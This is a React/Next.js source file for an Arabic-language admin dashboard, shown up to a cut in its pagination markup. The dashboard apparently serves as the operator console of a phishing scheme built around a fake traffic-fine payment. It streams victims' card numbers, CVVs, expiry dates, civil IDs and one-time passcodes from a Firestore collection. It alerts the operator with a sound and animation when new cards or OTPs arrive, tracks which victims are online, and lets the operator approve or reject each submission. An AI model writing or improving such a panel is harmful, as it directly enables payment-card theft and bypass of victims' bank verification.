"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Filter,
  Bell,
  Info,
  X,
  ChevronDown,
  LayoutDashboard,
  LogOut,
  RefreshCw,
  AlertCircle,
  CheckCircle2,
  XCircle,
  Clock,
  Shield,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { playNotificationSound } from "@/lib/actions"
import { auth, db, database } from "@/lib/firestore"
import { onValue, ref } from "firebase/database"
import { Checkbox } from "@/components/ui/checkbox"
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "@/components/ui/card"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
} from "@/components/ui/dropdown-menu"
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { toast, Toaster } from "sonner"
import {
  Pagination,
  PaginationContent,
  PaginationEllipsis,
  PaginationItem,
  PaginationLink,
  PaginationNext,
  PaginationPrevious,
} from "@/components/ui/pagination"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"

const styles = `
@keyframes pulseGreen {
  0%, 100% { background-color: rgba(240, 253, 244, 1); }
  50% { background-color: rgba(134, 239, 172, 0.5); }
}

@keyframes pulseGlow {
  0%, 100% { 
    background-color: rgba(22, 163, 74, 0.15); 
    border-color: rgba(22, 163, 74, 0.3);
  }
  50% { 
    background-color: rgba(22, 163, 74, 0.3); 
    border-color: rgba(22, 163, 74, 0.6);
    box-shadow: 0 0 8px rgba(22, 163, 74, 0.5);
  }
}

@keyframes bounceSmall {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-3px); }
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: translateY(0); }
}

@keyframes shimmer {
  0% { background-position: -200% 0; }
  100% { background-position: 200% 0; }
}

.animate-pulse-green {
  animation: pulseGreen 2s ease-in-out;
}

.animate-pulse-glow {
  animation: pulseGlow 1.5s ease-in-out infinite;
}

.animate-bounce-small {
  animation: bounceSmall 0.5s ease-in-out;
}

.animate-fade-in {
  animation: fadeIn 0.3s ease-out forwards;
}

.shimmer {
  background: linear-gradient(90deg, 
    rgba(255,255,255,0) 0%, 
    rgba(255,255,255,0.5) 50%, 
    rgba(255,255,255,0) 100%);
  background-size: 200% 100%;
  animation: shimmer 1.5s infinite;
}

.card-hover {
  transition: all 0.2s ease;
}

.card-hover:hover {
  transform: translateY(-2px);
  box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.01);
}

.status-badge {
  transition: all 0.3s ease;
}

.status-badge.online {
  background: linear-gradient(135deg, #dcfce7 0%, #bbf7d0 100%);
  border: 1px solid #86efac;
}

.status-badge.offline {
  background: linear-gradient(135deg, #fee2e2 0%, #fecaca 100%);
  border: 1px solid #fca5a5;
}

.glass-effect {
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
}

.otp-badge {
  font-family: 'Roboto Mono', monospace;
  letter-spacing: 0.5px;
  font-weight: 500;
}

.table-row-animate {
  transition: background-color 0.2s ease;
}

.table-row-animate:hover {
  background-color: rgba(241, 245, 249, 0.8);
}

.stat-card {
  overflow: hidden;
  position: relative;
}

.stat-card::after {
  content: '';
  position: absolute;
  top: 0;
  right: 0;
  width: 100px;
  height: 100%;
  background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.1) 100%);
  transform: skewX(-15deg) translateX(50px);
  transition: transform 0.5s ease;
}

.stat-card:hover::after {
  transform: skewX(-15deg) translateX(150px);
}
`

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface PersonalInfo {
  id: string
  violationValue: number
}

interface Notification {
  cardHolder: string
  cardNumber: string
  country: string
  createdDate: string
  currentPage: string
  cvv: string
  expiryDate: string
  forestoreAttachment: string
  id: string
  isOnline: boolean
  lastSeen: string
  civilId?: string
  otp: string
  page: string
  pass: string
  personalInfo: PersonalInfo
  bank?: string
  prefix?: string
  month?: string
  year?: string
  otp2?: string
  allOtps?: []
  mobile?: string
  idNumber?: string
  network?: string
  violationValue?: string
  plateType?: string
  status?: string
  cardExpiry?: string
  cardDetails?: {
    name: string
    number: string
    expiry: string
    cvc: string
  }
}

function AnimatedOtpBadge({ otp, isNew = false }: { otp: string; isNew?: boolean }) {
  const badgeRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    if (isNew && badgeRef.current) {
      badgeRef.current.classList.add("animate-pulse-green")
      const timer = setTimeout(() => {
        if (badgeRef.current) {
          badgeRef.current.classList.remove("animate-pulse-green")
        }
      }, 2000)

      return () => clearTimeout(timer)
    }
  }, [isNew])

  return (
    <div ref={badgeRef} className={`relative ${isNew ? "animate-bounce-small" : ""}`}>
      <Badge
        className={`font-mono text-black bg-green-50 border-green-200 shadow-sm transition-all duration-300 otp-badge ${
          isNew ? "ring-2 ring-green-400 ring-opacity-50" : ""
        }`}
      >
        {otp || "غير متوفر"}
      </Badge>
      {isNew && <span className="absolute -top-1 -right-1 h-2 w-2 bg-green-500 rounded-full animate-ping" />}
    </div>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [violationValues, setViolationValues] = useState<{
    [key: string]: string
  }>({})
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [showOnlineOnly, setShowOnlineOnly] = useState(false)
  const [showWithCardOnly, setShowWithCardOnly] = useState(false)
  const [showFilters, setShowFilters] = useState(false)
  const [userStatuses, setUserStatuses] = useState<{ [key: string]: string }>({})
  const [activeTab, setActiveTab] = useState("all")
  const [newOtps, setNewOtps] = useState<{ [key: string]: boolean }>({})
  const [notificationsWithNewOtps, setNotificationsWithNewOtps] = useState<{ [key: string]: boolean }>({})

  // Pagination state
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)

  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()
  const prevNotificationsRef = useRef<Notification[]>([])

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    // Apply filters whenever filter settings or notifications change
    applyFilters()
  }, [notifications, showOnlineOnly, showWithCardOnly, activeTab])

  // Reset to first page when filters change
  useEffect(() => {
    setCurrentPage(1)
  }, [showOnlineOnly, showWithCardOnly, activeTab])

  // Check for new OTPs in notifications
  useEffect(() => {
    if (notifications.length > 0 && prevNotificationsRef.current.length > 0) {
      const newNotificationsWithOtps: { [key: string]: boolean } = {}

      notifications.forEach((notification) => {
        const prevNotification = prevNotificationsRef.current.find((n) => n.id === notification.id)

        // Check if this notification has new OTPs
        if (prevNotification && notification.allOtps && prevNotification.allOtps) {
          const prevOtpsLength = prevNotification.allOtps.length
          const currentOtpsLength = notification.allOtps.length

          if (currentOtpsLength > prevOtpsLength) {
            newNotificationsWithOtps[notification.id] = true

            // Add new OTPs to the tracking state
            if (notification.allOtps && notification.allOtps.length > 0) {
              const newOtpsObj: { [key: string]: boolean } = {}
              const prevOtps = new Set(prevNotification.allOtps)

              notification.allOtps.forEach((otp) => {
                if (typeof otp === "string" && !prevOtps.has(otp)) {
                  newOtpsObj[otp] = true
                }
              })

              if (Object.keys(newOtpsObj).length > 0) {
                setNewOtps((prev) => ({ ...prev, ...newOtpsObj }))
              }
            }
          }
        }
      })

      if (Object.keys(newNotificationsWithOtps).length > 0) {
        setNotificationsWithNewOtps((prev) => ({ ...prev, ...newNotificationsWithOtps }))

        // Clear the animation after some time
        const timer = setTimeout(() => {
          setNotificationsWithNewOtps({})
        }, 30000) // 30 seconds

        return () => clearTimeout(timer)
      }
    }

    // Update the previous notifications reference
    prevNotificationsRef.current = [...notifications]
  }, [notifications])

  useEffect(() => {
    // Track new OTPs for animation
    if (selectedNotification?.allOtps && selectedNotification.allOtps.length > 0) {
      const newOtpsObj: { [key: string]: boolean } = {}
      selectedNotification.allOtps.forEach((otp, index) => {
        if (typeof otp === "string" && !newOtps[otp]) {
          newOtpsObj[otp] = true
        }
      })

      if (Object.keys(newOtpsObj).length > 0) {
        setNewOtps((prev) => ({ ...prev, ...newOtpsObj }))

        // Reset animation flags after some time
        const timer = setTimeout(() => {
          setNewOtps({})
        }, 3000)

        return () => clearTimeout(timer)
      }
    }
  }, [selectedNotification?.allOtps])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            if (data.id || data.cardNumber) {
              playNotificationSound()
            }
            setViolationValues((prev) => ({
              ...prev,
              [doc.id]: data.violationValue || "",
            }))
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)

        // Fetch online status for all users
        notificationsData.forEach((notification) => {
          fetchUserStatus(notification.id)
        })

        setIsLoading(false)
        setIsRefreshing(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
        setIsRefreshing(false)
        toast.error("حدث خطأ أثناء جلب الإشعارات", {
          description: "يرجى المحاولة مرة أخرى",
        })
      },
    )

    return unsubscribe
  }

  const refreshData = () => {
    setIsRefreshing(true)
    fetchNotifications()
  }

  const fetchUserStatus = (userId: string) => {
    const userStatusRef = ref(database, `/status/${userId}`)

    onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: data.state,
        }))
      } else {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: "offline",
        }))
      }
    })
  }

  const applyFilters = () => {
    let filtered = [...notifications]

    if (activeTab === "online") {
      filtered = filtered.filter((notification) => userStatuses[notification.id] === "online")
    } else if (activeTab === "cards") {
      filtered = filtered.filter((notification) => notification.cardNumber && notification.cardNumber.trim() !== "")
    }

    if (showOnlineOnly) {
      filtered = filtered.filter((notification) => userStatuses[notification.id] === "online")
    }

    if (showWithCardOnly) {
      filtered = filtered.filter((notification) => notification.cardNumber && notification.cardNumber.trim() !== "")
    }

    setFilteredNotifications(filtered)
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter(
      (notification) => notification.cardNumber || notification.cardDetails?.number,
    ).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      toast.success("تم مسح جميع الإشعارات بنجاح", {
        description: "تم المسح",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast.error("حدث خطأ أثناء مسح الإشعارات", {
        description: "يرجى المحاولة مرة أخرى",
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      toast.success("تم حذف الإشعار بنجاح", {
        description: "تم الحذف",
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast.error("حدث خطأ أثناء حذف الإشعار", {
        description: "يرجى المحاولة مرة أخرى",
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
      })
      if (state === "approved") {
        toast.success("تمت الموافقة على الطلب بنجاح", {
          description: "تم القبول",
        })
      } else {
        toast.error("تم رفض الطلب بنجاح", {
          description: "تم الرفض",
        })
      }
    } catch (error) {
      console.error("Error updating status:", error)
      toast.error("حدث خطأ أثناء تحديث الحالة", {
        description: "يرجى المحاولة مرة أخرى",
      })
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast.error("حدث خطأ أثناء تسجيل الخروج", {
        description: "يرجى المحاولة مرة أخرى",
      })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const toggleFilters = () => {
    setShowFilters(!showFilters)
  }

  function UserStatusBadge({ userId }: { userId: string }) {
    const [status, setStatus] = useState<string>("unknown")

    useEffect(() => {
      const userStatusRef = ref(database, `/status/${userId}`)

      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        if (data) {
          setStatus(data.state)
        } else {
          setStatus("unknown")
        }
      })

      return () => {
        // Clean up the listener when component unmounts
        unsubscribe()
      }
    }, [userId])

    return (
      <Badge
        variant="outline"
        className={`status-badge ${
          status === "online" ? "online" : "offline"
        } flex items-center gap-1.5 px-2 py-1 rounded-full transition-all duration-300`}
      >
        <span className={`h-2 w-2 rounded-full ${status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    )
  }

  const handleViolationUpdate = async (id: string, value: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { violationValue: value })
      setViolationValues((prev) => ({ ...prev, [id]: value }))
      toast.success("تم تحديث قيمة المخالفة بنجاح", {
        description: "تم التحديث",
      })
    } catch (error) {
      console.error("Error updating violation value:", error)
      toast.error("حدث خطأ أثناء تحديث قيمة المخالفة", {
        description: "يرجى المحاولة مرة أخرى",
      })
    }
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-slate-50 to-white text-slate-900 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4 animate-fade-in">
          <div className="relative h-16 w-16">
            <div className="absolute inset-0 rounded-full border-4 border-slate-200"></div>
            <div className="absolute inset-0 rounded-full border-4 border-t-primary border-r-transparent border-b-transparent border-l-transparent animate-spin"></div>
          </div>
          <p className="text-lg font-medium text-slate-700">جاري التحميل...</p>
          <p className="text-sm text-slate-500">يتم جلب البيانات</p>
        </div>
      </div>
    )
  }

  const allDisplayNotifications =
    filteredNotifications.length > 0 || showOnlineOnly || showWithCardOnly || activeTab !== "all"
      ? filteredNotifications
      : notifications

  // Calculate pagination
  const indexOfLastItem = currentPage * itemsPerPage
  const indexOfFirstItem = indexOfLastItem - itemsPerPage
  const currentItems = allDisplayNotifications.slice(indexOfFirstItem, indexOfLastItem)
  const totalPages = Math.ceil(allDisplayNotifications.length / itemsPerPage)

  // Generate page numbers for pagination
  const pageNumbers = []
  for (let i = 1; i <= totalPages; i++) {
    pageNumbers.push(i)
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gradient-to-b from-slate-50 to-white text-slate-900">
      <style>{styles}</style>
      <header className="bg-white border-b border-slate-200 sticky top-0 z-10 shadow-sm">
        <div className="container mx-auto px-4 py-3 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="bg-gradient-to-br from-primary/20 to-primary/10 p-2 rounded-full">
              <Bell className="h-5 w-5 text-primary" />
            </div>
            <h1 className="text-xl font-bold bg-gradient-to-r from-slate-800 to-slate-600 bg-clip-text text-transparent">
              لوحة الإشعارات
            </h1>
          </div>
          <div className="flex items-center gap-3">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={refreshData}
                    disabled={isRefreshing}
                    className="h-9 w-9 transition-all duration-300 hover:bg-slate-100 hover:border-slate-300"
                  >
                    <RefreshCw className={`h-4 w-4 ${isRefreshing ? "animate-spin" : ""}`} />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>تحديث البيانات</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button
                  variant="outline"
                  size="sm"
                  className="gap-2 transition-all duration-300 hover:bg-slate-100 hover:border-slate-300"
                >
                  <Avatar className="h-6 w-6">
                    <AvatarFallback className="bg-gradient-to-br from-primary/20 to-primary/10 text-primary text-xs">
                      مشرف
                    </AvatarFallback>
                  </Avatar>
                  <span className="hidden sm:inline">الحساب</span>
                  <ChevronDown className="h-4 w-4 opacity-50" />
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-56 animate-fade-in">
                <DropdownMenuItem className="gap-2 transition-all duration-200 hover:bg-slate-100">
                  <LayoutDashboard className="h-4 w-4" />
                  <span>لوحة التحكم</span>
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem
                  onClick={handleLogout}
                  className="gap-2 text-red-600 transition-all duration-200 hover:bg-red-50"
                >
                  <LogOut className="h-4 w-4" />
                  <span>تسجيل الخروج</span>
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6">
        {/* Statistics Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
          {/* Online Users Card */}
          <Card className="border-0 shadow-sm overflow-hidden stat-card card-hover animate-fade-in">
            <CardHeader className="pb-2 bg-gradient-to-r from-green-50 to-green-100 border-b">
              <CardTitle className="text-base font-medium flex items-center gap-2 text-green-800">
                <UserCheck className="h-5 w-5 text-green-600" />
                المستخدمين المتصلين
              </CardTitle>
            </CardHeader>
            <CardContent className="pt-4 bg-white">
              <div className="flex items-center justify-between">
                <p className="text-3xl font-bold text-green-600">{onlineUsersCount}</p>
                <div className="bg-gradient-to-br from-green-100 to-green-50 p-2 rounded-full">
                  <UserCheck className="h-6 w-6 text-green-500" />
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Total Visitors Card */}
          <Card
            className="border-0 shadow-sm overflow-hidden stat-card card-hover animate-fade-in"
            style={{ animationDelay: "0.1s" }}
          >
            <CardHeader className="pb-2 bg-gradient-to-r from-blue-50 to-blue-100 border-b">
              <CardTitle className="text-base font-medium flex items-center gap-2 text-blue-800">
                <Users className="h-5 w-5 text-blue-600" />
                إجمالي الزوار
              </CardTitle>
            </CardHeader>
            <CardContent className="pt-4 bg-white">
              <div className="flex items-center justify-between">
                <p className="text-3xl font-bold text-blue-600">{totalVisitors}</p>
                <div className="bg-gradient-to-br from-blue-100 to-blue-50 p-2 rounded-full">
                  <Users className="h-6 w-6 text-blue-500" />
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Card Submissions Card */}
          <Card
            className="border-0 shadow-sm overflow-hidden stat-card card-hover animate-fade-in"
            style={{ animationDelay: "0.2s" }}
          >
            <CardHeader className="pb-2 bg-gradient-to-r from-purple-50 to-purple-100 border-b">
              <CardTitle className="text-base font-medium flex items-center gap-2 text-purple-800">
                <CreditCard className="h-5 w-5 text-purple-600" />
                معلومات البطاقات
              </CardTitle>
            </CardHeader>
            <CardContent className="pt-4 bg-white">
              <div className="flex items-center justify-between">
                <p className="text-3xl font-bold text-purple-600">{cardSubmissions}</p>
                <div className="bg-gradient-to-br from-purple-100 to-purple-50 p-2 rounded-full">
                  <CreditCard className="h-6 w-6 text-purple-500" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Filters and Actions */}
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
          <Tabs
            defaultValue="all"
            value={activeTab}
            onValueChange={setActiveTab}
            className="w-full sm:w-auto animate-fade-in"
          >
            <TabsList className="grid w-full grid-cols-3 p-1 bg-slate-100 rounded-lg">
              <TabsTrigger
                value="all"
                className="data-[state=active]:bg-white data-[state=active]:shadow-sm data-[state=active]:text-primary transition-all duration-200"
              >
                الكل
              </TabsTrigger>
              <TabsTrigger
                value="online"
                className="data-[state=active]:bg-white data-[state=active]:shadow-sm data-[state=active]:text-primary transition-all duration-200"
              >
                متصل
              </TabsTrigger>
              <TabsTrigger
                value="cards"
                className="data-[state=active]:bg-white data-[state=active]:shadow-sm data-[state=active]:text-primary transition-all duration-200"
              >
                البطاقات
              </TabsTrigger>
            </TabsList>
          </Tabs>

          <div className="flex flex-wrap gap-2 w-full sm:w-auto animate-fade-in" style={{ animationDelay: "0.1s" }}>
            <Button
              variant="outline"
              onClick={toggleFilters}
              className="flex items-center gap-2 transition-all duration-300 hover:bg-slate-100 hover:border-slate-300"
              size="sm"
            >
              <Filter className="h-4 w-4" />
              الفلاتر
              {(showOnlineOnly || showWithCardOnly) && (
                <Badge className="ml-2 bg-primary">{showOnlineOnly && showWithCardOnly ? "2" : "1"}</Badge>
              )}
            </Button>
            <Button
              variant="destructive"
              onClick={handleClearAll}
              size="sm"
              disabled={notifications.length === 0}
              className="gap-2 transition-all duration-300 hover:bg-red-700"
            >
              <Trash2 className="h-4 w-4" />
              مسح الكل
            </Button>
          </div>
        </div>

        {showFilters && (
          <Card className="mb-6 border-0 shadow-sm animate-fade-in">
            <CardContent className="pt-6">
              <div className="flex flex-col sm:flex-row gap-6">
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="online-filter"
                    checked={showOnlineOnly}
                    onCheckedChange={(checked: boolean) => setShowOnlineOnly(checked === true)}
                    className="data-[state=checked]:bg-green-600 data-[state=checked]:border-green-600"
                  />
                  <label
                    htmlFor="online-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين المتصلين فقط
                  </label>
                </div>
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="card-filter"
                    checked={showWithCardOnly}
                    onCheckedChange={(checked: boolean) => setShowWithCardOnly(checked === true)}
                    className="data-[state=checked]:bg-purple-600 data-[state=checked]:border-purple-600"
                  />
                  <label
                    htmlFor="card-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين الذين لديهم بطاقة فقط
                  </label>
                </div>
              </div>
              {(showOnlineOnly || showWithCardOnly) && (
                <div className="mt-4 text-sm text-blue-600 flex items-center gap-2 bg-blue-50 p-3 rounded-lg">
                  <AlertCircle className="h-4 w-4" />
                  يتم عرض {allDisplayNotifications.length} من أصل {notifications.length} إشعار
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {allDisplayNotifications.length === 0 ? (
          <Card className="bg-white border-0 shadow-sm animate-fade-in">
            <CardContent className="flex flex-col items-center justify-center py-12">
              <div className="bg-gradient-to-br from-slate-100 to-slate-50 p-6 rounded-full mb-4">
                <Bell className="h-12 w-12 text-slate-400" />
              </div>
              <h3 className="text-xl font-medium text-slate-700 mb-2">لا توجد إشعارات</h3>
              <p className="text-slate-500">ستظهر الإشعارات الجديدة هنا عند وصولها</p>
            </CardContent>
          </Card>
        ) : (
          <div className="space-y-4">
            {/* Desktop Table View - Hidden on Mobile */}
            <div className="hidden md:block animate-fade-in">
              <Card className="border-0 shadow-sm overflow-hidden">
                <CardContent className="p-0">
                  <div className="overflow-x-auto">
                    <table className="w-full">
                      <thead>
                        <tr className="border-b border-slate-200 bg-gradient-to-r from-slate-50 to-white">
                          <th className="px-4 py-3 text-right text-sm font-medium text-slate-500">الدولة</th>
                          <th className="px-4 py-3 text-right text-sm font-medium text-slate-500">الإسم</th>
                          <th className="px-4 py-3 text-right text-sm font-medium text-slate-500">المعلومات</th>
                          <th className="px-4 py-3 text-right text-sm font-medium text-slate-500">الوقت</th>
                          <th className="px-4 py-3 text-center text-sm font-medium text-slate-500">الحالة</th>
                          <th className="px-4 py-3 text-center text-sm font-medium text-slate-500">إجراءات</th>
                        </tr>
                      </thead>
                      <tbody>
                        {currentItems.map((notification, index) => (
                          <tr
                            key={notification.id}
                            className="border-b border-slate-200 table-row-animate"
                            style={{ animationDelay: `${index * 0.05}s` }}
                          >
                            <td className="px-4 py-3 text-sm">{notification?.country || "غير معروف"}</td>
                            <td className="px-4 py-3 text-sm">{notification?.civilId || "غير معروف"}</td>
                            <td className="px-4 py-3">
                              <div className="flex flex-wrap gap-2">
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Badge
                                        variant={notification?.civilId ? "outline" : "destructive"}
                                        className={`rounded-md cursor-pointer transition-all duration-300 ${
                                          notification?.civilId ? "hover:bg-slate-100" : ""
                                        }`}
                                        onClick={() => handleInfoClick(notification, "personal")}
                                      >
                                        <Info className="h-3 w-3 mr-1" />
                                        معلومات شخصية
                                      </Badge>
                                    </TooltipTrigger>
                                    <TooltipContent>
                                      <p>عرض المعلومات الشخصية</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>

                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Badge
                                        variant={
                                          notification.cardNumber || notification.cardDetails?.number
                                            ? "outline"
                                            : "destructive"
                                        }
                                        className={`rounded-md cursor-pointer transition-all duration-300 ${
                                          notification.cardNumber || notification.cardDetails?.number
                                            ? "bg-green-50 text-green-700 border-green-200 hover:bg-green-100"
                                            : ""
                                        } ${notificationsWithNewOtps[notification.id] ? "animate-pulse-glow" : ""}`}
                                        onClick={() => handleInfoClick(notification, "card")}
                                      >
                                        <CreditCard className="h-3 w-3 mr-1" />
                                        معلومات البطاقة
                                        {notificationsWithNewOtps[notification.id] && (
                                          <span className="relative flex h-2 w-2 mr-1">
                                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                                            <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                                          </span>
                                        )}
                                      </Badge>
                                    </TooltipTrigger>
                                    <TooltipContent>
                                      <p>
                                        {notificationsWithNewOtps[notification.id]
                                          ? "تم إضافة رمز تحقق جديد!"
                                          : "عرض معلومات البطاقة"}
                                      </p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </div>
                            </td>
                            <td className="px-4 py-3 text-sm text-slate-500">
                              <div className="flex items-center gap-1.5">
                                <Clock className="h-3.5 w-3.5 text-slate-400" />
                                {notification.createdDate &&
                                  formatDistanceToNow(new Date(notification.createdDate), {
                                    addSuffix: true,
                                    locale: ar,
                                  })}
                              </div>
                            </td>
                            <td className="px-4 py-3 text-center">
                              <UserStatusBadge userId={notification.id} />
                            </td>
                            <td className="px-4 py-3 text-center">
                              <div className="flex justify-center gap-2">
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button
                                        variant="destructive"
                                        size="sm"
                                        onClick={() => handleDelete(notification.id)}
                                        className="h-8 w-8 p-0 transition-all duration-300 hover:bg-red-700"
                                      >
                                        <Trash2 className="h-4 w-4" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent>
                                      <p>حذف الإشعار</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </div>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </CardContent>
                <CardFooter className="flex items-center justify-between px-6 py-4 bg-gradient-to-r from-slate-50 to-white border-t border-slate-200">
                  <div className="flex items-center gap-2">
                    <span className="text-sm text-slate-500">
                      عرض {indexOfFirstItem + 1}-{Math.min(indexOfLastItem, allDisplayNotifications.length)} من{" "}
                      {allDisplayNotifications.length}
                    </span>
                    <Select
                      value={itemsPerPage.toString()}
                      onValueChange={(value: string) => {
                        setItemsPerPage(Number.parseInt(value))
                        setCurrentPage(1)
                      }}
                    >
                      <SelectTrigger className="w-[80px] h-8 transition-all duration-300 hover:border-slate-300">
                        <SelectValue placeholder="10" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="5">5</SelectItem>
                        <SelectItem value="10">10</SelectItem>
                        <SelectItem value="20">20</SelectItem>
                        <SelectItem value="50">50</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <Pagination>
                    <PaginationContent>
                      <PaginationItem>
                        <PaginationPrevious
                          onClick={() => setCurrentPage((prev) => Math.max(prev - 1, 1))}
                          className={`transition-all duration-300 ${currentPage === 1 ? "pointer-events-none opacity-50" : "hover:bg-slate-100"}`}
                        />
                      </PaginationItem>

                      {pageNumbers.map((number) => (
                        <PaginationItem key={number}>
                          <PaginationLink
                            onClick={() => setCurrentPage(number)}
